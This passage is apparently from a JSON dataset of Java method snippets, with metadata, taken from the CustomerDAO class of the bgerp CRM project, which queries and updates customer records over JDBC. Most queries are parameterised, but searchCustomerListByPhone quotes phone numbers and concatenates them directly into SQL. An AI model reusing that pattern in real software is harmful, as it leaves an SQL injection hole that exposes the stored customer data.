query.append(selectPart);\n            query.append(\"customer.* FROM \" + TABLE_CUSTOMER + \" AS customer\");\n            query.append(joinPart);\n            if (Utils.notBlankString(title)) {\n                query.append(\" WHERE title LIKE ? \");\n                ps.addString(title);\n            }\n            query.append(\" ORDER BY title\");\n            query.append(getPageLimit(page));\n\n            if (log.isDebugEnabled()) {\n                log.debug(query.toString());\n            }\n\n            ps.addQuery(query.toString());\n\n            extractCustomersWithRef(page, list, referenceTemplate, ps);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57244, "method_name": "searchCustomerList", "class_name": "CustomerDAO", "params": ["SearchResult<Customer>", "Set<Integer>"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchCustomerList(SearchResult<Customer> searchResult, Set<Integer> groupIds) throws BGException {\n        Page page = searchResult.getPage();\n        List<Customer> list = searchResult.getList();\n\n        StringBuilder selectPart = new StringBuilder();\n        StringBuilder joinPart = new StringBuilder();\n\n        String referenceTemplate = addCustomerReferenceQuery(selectPart, joinPart);\n\n        if (CollectionUtils.isNotEmpty(groupIds)) {\n            joinPart.append(\" INNER JOIN \" + TABLE_CUSTOMER_GROUP + \" AS customer_group ON customer.id=customer_group.customer_id \"\n                    + \"AND customer_group.group_id IN (\" + Utils.toString(groupIds) + \") \");\n\n            PreparedDelay ps = new PreparedDelay(con);\n\n            StringBuilder query = new StringBuilder();\n            query.append(SQL_SELECT_COUNT_ROWS + \" DISTINCT \");\n            query.append(selectPart);\n            query.append(\"customer.* FROM \" + TABLE_CUSTOMER + \" AS customer\");\n            query.append(joinPart);\n            query.append(\" ORDER BY title\");\n            query.append(getPageLimit(page));\n\n            if (log.isDebugEnabled()) {\n                log.debug(query.toString());\n            }\n\n            ps.addQuery(query.toString());\n\n            extractCustomersWithRef(page, list, referenceTemplate, ps);\n        }\n\n        PreparedDelay ps = new PreparedDelay(con);\n\n        StringBuilder query = new StringBuilder();\n        query.append(SQL_SELECT_COUNT_ROWS + \" DISTINCT \");\n        query.append(selectPart);\n        query.append(\"customer.* FROM \" + TABLE_CUSTOMER + \" AS customer\");\n        query.append(joinPart);\n        query.append(\" ORDER BY title\");\n        query.append(getPageLimit(page));\n\n        if (log.isDebugEnabled()) {\n            log.debug(query.toString());\n        }\n\n        ps.addQuery(query.toString());\n\n        extractCustomersWithRef(page, list, referenceTemplate, ps);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57245, "method_name": "extractCustomerWithRef", "class_name": "CustomerDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Customer", "snippet": "    public Customer extractCustomerWithRef(int customerId) throws BGException {\n        try {\n            int index = 1;\n            StringBuilder query = new StringBuilder();\n            StringBuilder selectPart = new StringBuilder();\n            StringBuilder joinPart = new StringBuilder();\n\n            String referenceTemplate = addCustomerReferenceQuery(selectPart, joinPart);\n\n            query.append(SQL_SELECT);\n            query.append(selectPart);\n            query.append(\" customer.* \");\n            query.append(SQL_FROM);\n            query.append(TABLE_CUSTOMER);\n            query.append(\" AS customer\");\n            query.append(joinPart);\n            query.append(\" WHERE customer.id = ? \");\n\n            PreparedStatement ps = con.prepareStatement(query.toString());\n            ps.setInt(index++, customerId);\n\n            final ResultSet rs = ps.executeQuery();\n\n            while (rs.next()) {\n                if (Utils.notBlankString(referenceTemplate)) {\n                    Customer customer = getCustomerFromRs(rs, \"\");\n\n                    String reference = PatternFormatter.processPattern(referenceTemplate, new PatternItemProcessor() {\n                        @Override\n                        public String processPatternItem(String variable) {\n                            String value = \"\";\n                            try {\n                                if (variable.startsWith(\"param:\")) {\n                                    value = rs.getString(variable.replace(':', '_') + \"_val\");\n                                }\n                            } catch (Exception e) {\n                                log.error(e.getMessage(), e);\n                            }\n                            return value;\n                        }\n                    });\n\n                    ps.close();\n                    customer.setReference(reference);\n                    return customer;\n                }\n            }\n            ps.close();\n            return null;\n        } catch (SQLException e) {\n            throw new BGException(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57246, "method_name": "extractCustomersWithRef", "class_name": "CustomerDAO", "params": ["Page", "List<Customer>", "String", "PreparedDelay"], "throws": ["BGException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void extractCustomersWithRef(Page page, List<Customer> list, String referenceTemplate, PreparedDelay ps) throws BGException {\n        try {\n            final ResultSet rs = ps.executeQuery();\n            while (rs.next()) {\n                Customer customer = getCustomerFromRs(rs, \"\");\n                list.add(customer);\n\n                if (Utils.notBlankString(referenceTemplate)) {\n                    String reference = PatternFormatter.processPattern(referenceTemplate, new PatternItemProcessor() {\n                        @Override\n                        public String processPatternItem(String variable) {\n                            String value = \"\";\n                            try {\n                                if (variable.startsWith(\"param:\")) {\n                                    value = rs.getString(variable.replace(':', '_') + \"_val\");\n                                }\n                            } catch (Exception e) {\n                                log.error(e.getMessage(), e);\n                            }\n                            return value;\n                        }\n                    });\n                    customer.setReference(reference);\n                }\n            }\n            if (page != null) {\n                page.setRecordCount(getFoundRows(ps.getPrepared()));\n            }\n            ps.close();\n        } catch (SQLException ex) {\n            throw new BGException(ex);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57247, "method_name": "addCustomerReferenceQuery", "class_name": "CustomerDAO", "params": ["StringBuilder", "StringBuilder"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String addCustomerReferenceQuery(final StringBuilder selectPart, final StringBuilder joinPart) {\n        String referenceTemplate = Setup.getSetup().get(\"customer.reference.pattern\", \"\");\n        if (Utils.notBlankString(referenceTemplate)) {\n            PatternFormatter.processPattern(referenceTemplate, new PatternItemProcessor() {\n                @Override\n                public String processPatternItem(String variable) {\n                    if (variable.startsWith(\"param:\")) {\n                        ParamValueDAO.paramSelectQuery(variable, \"customer.id\", selectPart, joinPart, true);\n                        selectPart.append(\", \");\n                    }\n                    return \"\";\n                }\n            });\n        }\n        return referenceTemplate;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57248, "method_name": "searchCustomerListByEmail", "class_name": "CustomerDAO", "params": ["SearchResult<ParameterSearchedObject>", "List<Integer>", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchCustomerListByEmail(SearchResult<ParameterSearchedObject<Customer>> searchResult, List<Integer> emailParamIdList, String email)\n            throws BGException {\n        new ParamValueSearchDAO(con).searchObjectListByEmail(TABLE_CUSTOMER, rs -> getCustomerFromRs(rs, \"c.\"), searchResult, emailParamIdList,\n                email);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57249, "method_name": "searchCustomerListByText", "class_name": "CustomerDAO", "params": ["SearchResult<Customer>", "List<Integer>", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchCustomerListByText(SearchResult<Customer> searchResult, List<Integer> textParamIdList, String value) throws SQLException {\n        if (searchResult != null) {\n            Page page = searchResult.getPage();\n            List<Customer> list = searchResult.getList();\n\n            StringBuilder query = new StringBuilder();\n            String ids = Utils.toString(textParamIdList);\n\n            query.append(SQL_SELECT);\n            query.append(\"DISTINCT c.*\");\n            query.append(SQL_FROM);\n            query.append(TABLE_CUSTOMER);\n            query.append(\"AS c \");\n            query.append(SQL_INNER_JOIN);\n            query.append(TABLE_PARAM_TEXT);\n            query.append(\"AS param ON c.id=param.id AND \");\n            query.append(\"param.value LIKE ?\");\n\n            if (Utils.notBlankString(ids)) {\n                query.append(\" AND param.param_id IN (\");\n                query.append(ids);\n                query.append(\")\");\n            }\n            query.append(SQL_ORDER_BY);\n            query.append(\"c.title\");\n            query.append(getPageLimit(page));\n\n            PreparedStatement ps = con.prepareStatement(query.toString());\n            ps.setString(1, value);\n\n            ResultSet rs = ps.executeQuery();\n\n            while (rs.next()) {\n                list.add(getCustomerFromRs(rs, \"\"));\n            }\n            if (page != null) {\n                page.setRecordCount(getFoundRows(ps));\n            }\n            ps.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57250, "method_name": "searchCustomerListByAddress", "class_name": "CustomerDAO", "params": ["SearchResult<ParameterSearchedObject>", "List<Integer>", "int", "String", "String", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchCustomerListByAddress(SearchResult<ParameterSearchedObject<Customer>> searchResult, List<Integer> addressParamIdList,\n            int streetId, String house, String houseFlat, String houseRoom) throws SQLException {\n        if (searchResult != null) {\n            Page page = searchResult.getPage();\n            List<ParameterSearchedObject<Customer>> list = searchResult.getList();\n\n            PreparedDelay ps = new PreparedDelay(con);\n            String ids = Utils.toString(addressParamIdList);\n\n            AddressHouse searchParams = AddressHouse.extractHouseAndFrac(house);\n\n            int number = searchParams.getHouse();\n            String frac = searchParams.getFrac();\n\n            ps.addQuery(SQL_SELECT_COUNT_ROWS);\n            ps.addQuery(\"DISTINCT param.param_id, param.value, c.* \");\n            ps.addQuery(SQL_FROM);\n            ps.addQuery(TABLE_CUSTOMER);\n            ps.addQuery(\"AS c \");\n\n            ps.addQuery(SQL_INNER_JOIN);\n            ps.addQuery(TABLE_PARAM_ADDRESS);\n            ps.addQuery(\"AS param ON c.id=param.id AND param.param_id IN (\");\n            ps.addQuery(ids);\n            ps.addQuery(\")\");\n            if (Utils.notBlankString(houseFlat)) {\n                ps.addQuery(\" AND param.flat=?\");\n                ps.addString(houseFlat);\n            }\n            if (Utils.notBlankString(houseRoom)) {\n                ps.addQuery(\" AND param.room=?\");\n                ps.addString(houseRoom);\n            }\n\n            ps.addQuery(SQL_INNER_JOIN);\n            ps.addQuery(TABLE_ADDRESS_HOUSE);\n            ps.addQuery(\"AS house ON param.house_id=house.id\");\n            ps.addQuery(\" AND house.street_id=?\");\n            ps.addInt(streetId);\n            if (number > 0) {\n                ps.addQuery(\" AND house.house=?\");\n                ps.addInt(number);\n            }\n            if (Utils.notBlankString(frac)) {\n                ps.addQuery(\" AND house.frac=?\");\n                ps.addString(frac);\n            }\n\n            ps.addQuery(SQL_LEFT_JOIN);\n            ps.addQuery(TABLE_PARAM_PREF);\n            ps.addQuery(\"AS pref ON param.param_id=pref.id \");\n\n            ps.addQuery(SQL_ORDER_BY);\n            ps.addQuery(\"c.title\");\n            ps.addQuery(getPageLimit(page));\n\n            ResultSet rs = ps.executeQuery();\n            while (rs.next()) {\n                list.add(new ParameterSearchedObject<Customer>(getCustomerFromRs(rs, \"c.\"), rs.getInt(1), rs.getString(2)));\n            }\n\n            setRecordCount(page, ps.getPrepared());\n            ps.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57251, "method_name": "searchCustomerListByAddress", "class_name": "CustomerDAO", "params": ["SearchResult<ParameterSearchedObject>", "List<Integer>", "int", "String", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchCustomerListByAddress(SearchResult<ParameterSearchedObject<Customer>> searchResult, List<Integer> addressParamIdList,\n            int houseId, String houseFlat, String houseRoom) throws BGException {\n        if (searchResult != null) {\n            Page page = searchResult.getPage();\n            List<ParameterSearchedObject<Customer>> list = searchResult.getList();\n\n            PreparedDelay ps = new PreparedDelay(con);\n            String ids = Utils.toString(addressParamIdList);\n\n            ps.addQuery(SQL_SELECT_COUNT_ROWS);\n            ps.addQuery(\"DISTINCT param.param_id, param.value, c.* \");\n            ps.addQuery(SQL_FROM);\n            ps.addQuery(TABLE_CUSTOMER);\n            ps.addQuery(\"AS c \");\n\n            ps.addQuery(SQL_INNER_JOIN);\n            ps.addQuery(TABLE_PARAM_ADDRESS);\n            ps.addQuery(\"AS param ON c.id=param.id AND param.param_id IN (\");\n            ps.addQuery(ids);\n            ps.addQuery(\")\");\n\n            ps.addQuery(\" AND param.house_id=?\");\n            ps.addInt(houseId);\n\n            if (Utils.notBlankString(houseFlat)) {\n                ps.addQuery(\" AND param.flat=?\");\n                ps.addString(houseFlat);\n            }\n            if (Utils.notBlankString(houseRoom)) {\n                ps.addQuery(\" AND param.room=?\");\n                ps.addString(houseRoom);\n            }\n\n            ps.addQuery(SQL_ORDER_BY);\n            ps.addQuery(\"c.title\");\n            ps.addQuery(getPageLimit(page));\n\n            try {\n                ResultSet rs = ps.executeQuery();\n                while (rs.next()) {\n                    list.add(new ParameterSearchedObject<Customer>(getCustomerFromRs(rs, \"c.\"), rs.getInt(1), rs.getString(2)));\n                }\n\n                setRecordCount(page, ps.getPrepared());\n                ps.close();\n            } catch (SQLException ex) {\n                throw new BGException(ex);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57252, "method_name": "searchCustomerListByPhone", "class_name": "CustomerDAO", "params": ["SearchResult<Customer>", "Collection<Integer>", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchCustomerListByPhone(SearchResult<Customer> searchResult, Collection<Integer> phoneParamIdList, String... phoneNumbers)\n            throws BGException {\n        if (searchResult != null) {\n            Page page = searchResult.getPage();\n            List<Customer> list = searchResult.getList();\n            String ids = Utils.toString(phoneParamIdList);\n\n            StringBuilder selectPart = new StringBuilder();\n            StringBuilder joinPart = new StringBuilder();\n            StringBuilder query = new StringBuilder();\n\n            selectPart.append(SQL_SELECT);\n            selectPart.append(\" DISTINCT \");\n\n            joinPart.append(SQL_INNER_JOIN);\n            joinPart.append(TABLE_PARAM_PHONE_ITEM);\n            joinPart.append(\" AS p ON customer.id=p.id \");\n            if (ids.length() > 0) {\n                joinPart.append(\"AND p.param_id IN ( \");\n                joinPart.append(ids);\n                joinPart.append(\" ) \");\n            }\n\n            // \u0438\u043d\u0430\u0447\u0435 MySQL \u043d\u0435 \u043f\u043e\u043d\u0438\u043c\u0430\u0435\u0442, \u0447\u0442\u043e \u043c\u043e\u0436\u043d\u043e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0438\u043d\u0434\u0435\u043a\u0441\n            for (int i = 0; i < phoneNumbers.length; i++) {\n                phoneNumbers[i] = \"'\" + phoneNumbers[i] + \"'\";\n            }\n\n            joinPart.append(\" AND p.phone IN (\");\n            joinPart.append(Utils.toString(Arrays.asList(phoneNumbers)));\n            joinPart.append(\")\");\n\n            String referenceTemplate = addCustomerReferenceQuery(selectPart, joinPart);\n\n            query.append(selectPart);\n            query.append(\" customer.* \");\n            query.append(SQL_FROM);\n            query.append(TABLE_CUSTOMER);\n            query.append(joinPart);\n            query.append(SQL_WHERE);\n            query.append(\"1=1 \");\n\n            query.append(\" ORDER BY customer.title \");\n            query.append(getPageLimit(page));\n\n            PreparedDelay ps = new PreparedDelay(con);\n            ps.addQuery(query.toString());\n            extractCustomersWithRef(page, list, referenceTemplate, ps);\n            ps.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57253, "method_name": "searchCustomerByLinkedObjectTitle", "class_name": "CustomerDAO", "params": ["SearchResult<Customer>", "String", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchCustomerByLinkedObjectTitle(SearchResult<Customer> searchResult, String linkedObjectTypeLike, String linkedObjectTitle)\n            throws BGException {\n        if (searchResult != null) {\n            Page page = searchResult.getPage();\n            List<Customer> list = searchResult.getList();\n\n            StringBuilder selectPart = new StringBuilder();\n            StringBuilder joinPart = new StringBuilder();\n            StringBuilder query = new StringBuilder();\n\n            selectPart.append(SQL_SELECT);\n            selectPart.append(\" DISTINCT \");\n\n            joinPart.append(SQL_INNER_JOIN);\n            joinPart.append(TABLE_CUSTOMER_LINK);\n            joinPart.append(\" AS link ON link.customer_id = customer.id \");\n            joinPart.append(\"AND link.object_title LIKE ? \");\n            joinPart.append(\"AND link.object_type LIKE ? \");\n\n            String referenceTemplate = addCustomerReferenceQuery(selectPart, joinPart);\n\n            query.append(selectPart);\n            query.append(\" customer.* \");\n            query.append(SQL_FROM);\n            query.append(TABLE_CUSTOMER);\n            query.append(joinPart);\n\n            query.append(\" ORDER BY customer.title \");\n            query.append(getPageLimit(page));\n\n            PreparedDelay ps = new PreparedDelay(con);\n            ps.addQuery(query.toString());\n            ps.addString(linkedObjectTitle);\n            ps.addString(linkedObjectTypeLike);\n            extractCustomersWithRef(page, list, referenceTemplate, ps);\n            ps.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57254, "method_name": "getCustomerById", "class_name": "CustomerDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Customer", "snippet": "    public Customer getCustomerById(int customerId) throws BGException {\n        Customer customer = null;\n\n        try {\n            String sql = \"SELECT * FROM customer WHERE id=?\";\n            PreparedStatement ps = con.prepareStatement(sql);\n            ps.setInt(1, customerId);\n            ResultSet rs = ps.executeQuery();\n            if (rs.next()) {\n                customer = getCustomerFromRs(rs, \"\");\n            }\n            ps.close();\n        } catch (SQLException e) {\n            throw new BGException(e);\n        }\n\n        return customer;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57255, "method_name": "getCustomers", "class_name": "CustomerDAO", "params": ["Connection", "Collection<Integer>"], "throws": ["BGException"], "modifiers": ["public", "static"], "return_type": "Set<Customer>", "snippet": "    public static Set<Customer> getCustomers(Connection connection, Collection<Integer> customerIds) throws BGException {\n        Set<Customer> customers = new HashSet<Customer>();\n\n        String sql = \"SELECT * FROM customer WHERE customer.id IN ( \";\n        sql += Utils.toString(customerIds);\n        sql += \" )\";\n\n        try {\n            PreparedStatement ps = connection.prepareStatement(sql);\n            ResultSet rs = ps.executeQuery();\n\n            while (rs.next()) {\n                customers.add(getCustomerFromRs(rs, \"\"));\n            }\n\n            ps.close();\n        } catch (SQLException exception) {\n            throw new BGException(exception);\n        }\n\n        return customers;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57256, "method_name": "getCustomers", "class_name": "CustomerDAO", "params": ["Collection<Integer>"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Set<Customer>", "snippet": "    public Set<Customer> getCustomers(Collection<Integer> customerIds) throws BGException {\n        return getCustomers(con, customerIds);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57257, "method_name": "getCustomerByTitle", "class_name": "CustomerDAO", "params": ["String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Customer", "snippet": "    public Customer getCustomerByTitle(String customerTitle) throws SQLException {\n        Customer customer = null;\n\n        int index = 1;\n\n        PreparedStatement ps = con.prepareStatement(\"SELECT * FROM customer WHERE UPPER(title)=?\");\n        ps.setString(index++, customerTitle.toUpperCase());\n        ResultSet rs = ps.executeQuery();\n        while (rs.next()) {\n            customer = getCustomerFromRs(rs, \"\");\n        }\n        ps.close();\n\n        return customer;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57258, "method_name": "updateCustomer", "class_name": "CustomerDAO", "params": ["Customer"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateCustomer(Customer customer) throws SQLException {\n        if (customer != null) {\n            int index = 1;\n            PreparedStatement ps = null;\n            StringBuilder query = new StringBuilder();\n\n            if (customer.getId() > 0) {\n                query.append(SQL_UPDATE);\n                query.append(TABLE_CUSTOMER);\n                query.append(\" SET title=?, title_pattern=?, title_pattern_id=?, param_group_id=?\");\n                query.append(\" WHERE id=?\");\n                ps = con.prepareStatement(query.toString());\n                ps.setString(index++, customer.getTitle());\n                ps.setString(index++, customer.getTitlePattern());\n                ps.setInt(index++, customer.getTitlePatternId());\n                ps.setInt(index++, customer.getParamGroupId());\n                ps.setInt(index++, customer.getId());\n                ps.executeUpdate();\n            } else {\n                query.append(SQL_INSERT);\n                query.append(TABLE_CUSTOMER);\n                query.append(\" SET title=?, title_pattern=?, title_pattern_id=?, param_group_id=?,\");\n                query.append(\" date_created=now(), user_id_created=?\");\n                ps = con.prepareStatement(query.toString(), Statement.RETURN_GENERATED_KEYS);\n                ps.setString(index++, customer.getTitle());\n                ps.setString(index++, customer.getTitlePattern());\n                ps.setInt(index++, customer.getTitlePatternId());\n                ps.setInt(index++, customer.getParamGroupId());\n                ps.setInt(index++, customer.getCreatedUserId());\n                ps.executeUpdate();\n                customer.setId(lastInsertId(ps));\n            }\n\n            ps.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57259, "method_name": "deleteCustomer", "class_name": "CustomerDAO", "params": ["int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteCustomer(int id) throws SQLException {\n        PreparedStatement ps = con.prepareStatement(\"DELETE FROM \" + TABLE_CUSTOMER + \" WHERE id=?\");\n        ps.setInt(1, id);\n        ps.executeUpdate();\n        ps.close();\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57260, "method_name": "updateCustomerTitle", "class_name": "CustomerDAO", "params": ["String", "Customer", "int", "Response"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateCustomerTitle(String titleBefore, Customer customer, int changedParamId, Response response) throws Exception {\n        PatternDAO patternDAO = new PatternDAO(con);\n        ParamValueDAO paramValueDAO = new ParamValueDAO(con);\n\n        Customer oldCustomer = getCustomerById(customer.getId());\n        oldCustomer.setGroupIds(this.getGroupIds(customer.getId()));\n\n        try {\n            // \u043f\u0440\u0435\u0434\u043f\u043e\u043b\u0430\u0433\u0430\u0435\u043c, \u0447\u0442\u043e -1 - \u043f\u0435\u0440\u0441\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u0439 \u0448\u0430\u0431\u043b\u043e\u043d\n            String titlePattern = customer.getTitlePattern();\n            // \u0431\u0435\u0437 \u0448\u0430\u0431\u043b\u043e\u043d\u0430\n            if (customer.getTitlePatternId() == 0) {\n                customer.setTitlePattern(titlePattern = \"\");\n            }\n            // \u0448\u0430\u0431\u043b\u043e\u043d \u0438\u0437 \u0441\u043f\u0440\u0430\u0432\u043e\u0447\u043d\u0438\u043a\u0430\n            else if (customer.getTitlePatternId() > 0) {\n                Pattern pattern = patternDAO.getPattern(customer.getTitlePatternId());\n                if (pattern != null) {\n                    titlePattern = pattern.getPattern();\n                }\n            }\n\n            // \u0444\u043e\u0440\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u044f \u043f\u043e \u0448\u0430\u0431\u043b\u043e\u043d\u0443\n            if (Utils.notBlankString(titlePattern) && (changedParamId < 0 || titlePattern.contains(String.valueOf(changedParamId)))) {\n                customer.setTitle(Utils.formatPatternString(Customer.OBJECT_TYPE, customer.getId(), paramValueDAO, titlePattern));\n            }\n\n            if (oldCustomer != null) {\n                logCustomerChange(customer, oldCustomer);\n            }\n\n            updateCustomer(customer);\n\n            boolean changed = !titleBefore.equals(customer.getTitle());\n            if (changed && response != null) {\n                response.addEvent(new CustomerTitleChangedEvent(customer.getId(), customer.getTitle()));\n            }\n\n            if (changed) {\n                // \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u043d\u0430\u0438\u043c\u0435\u043d\u043e\u0432\u0430\u043d\u0438\u044f \u043a\u043e\u043d\u0442\u0440\u0430\u0433\u0435\u043d\u0442\u0430 \u0432 \u043f\u0440\u0438\u0432\u044f\u0437\u043a\u0430\u0445 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0432\n                new ProcessLinkDAO(con).updateLinkTitles(customer.getId(), Customer.OBJECT_TYPE + \"%\", customer.getTitle());\n            }\n        } catch (SQLException e) {\n            throw new BGException(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57261, "method_name": "getCustomerTitles", "class_name": "CustomerDAO", "params": ["String", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getCustomerTitles(String title, int count) throws BGException {\n        List<String> result = new ArrayList<String>();\n\n        try {\n            String query = \" SELECT title FROM \" + TABLE_CUSTOMER + \" WHERE title LIKE ? \" + \" GROUP BY title ORDER BY title LIMIT ?\";\n\n            PreparedStatement ps = con.prepareStatement(query);\n            ps.setString(1, title);\n            ps.setInt(2, count);\n\n            ResultSet rs = ps.executeQuery();\n            while (rs.next()) {\n                result.add(rs.getString(1));\n            }\n            ps.close();\n        } catch (SQLException e) {\n            throw new BGException(e);\n        }\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57262, "method_name": "getGroupIds", "class_name": "CustomerDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Set<Integer>", "snippet": "    public Set<Integer> getGroupIds(int customerId) throws BGException {\n        return getIds(TABLE_CUSTOMER_GROUP, \"customer_id\", \"group_id\", customerId);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57263, "method_name": "updateGroupIds", "class_name": "CustomerDAO", "params": ["int", "Set<Integer>"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateGroupIds(int customerId, Set<Integer> groupIds) throws BGException {\n        updateIds(TABLE_CUSTOMER_GROUP, \"customer_id\", \"group_id\", customerId, groupIds);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57264, "method_name": "getCustomerFromRs", "class_name": "CustomerDAO", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public", "static"], "return_type": "Customer", "snippet": "    public static Customer getCustomerFromRs(ResultSet rs, String prefix) throws SQLException {\n        Customer customer = new Customer();\n\n        customer.setId(rs.getInt(prefix + \"id\"));\n        customer.setTitle(rs.getString(prefix + \"title\"));\n        customer.setTitlePattern(rs.getString(prefix + \"title_pattern\"));\n        customer.setTitlePatternId(rs.getInt(prefix + \"title_pattern_id\"));\n        customer.setParamGroupId(rs.getInt(prefix + \"param_group_id\"));\n        customer.setCreatedDate(rs.getTimestamp(prefix + \"date_created\"));\n        customer.setCreatedUserId(rs.getInt(prefix + \"user_id_created\"));\n        customer.setPassword(rs.getString(prefix + \"pswd\"));\n\n        return customer;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/CustomerDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57265, "method_name": "logCustomerChange", "class_name": "CustomerDAO", "params": ["Customer", "Customer"], "throws": ["BGException", "SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void logCustomerChange(Customer customer, Customer oldCustomer) throws BGException, SQLException {\n        if (history) {\n            EntityLogDAO entityLogDAO = new EntityLogDAO(this.con, TABLE_CUSTOMER_LOG);\n            entityLogDAO.insertEntityLog(customer.getId(), userId, 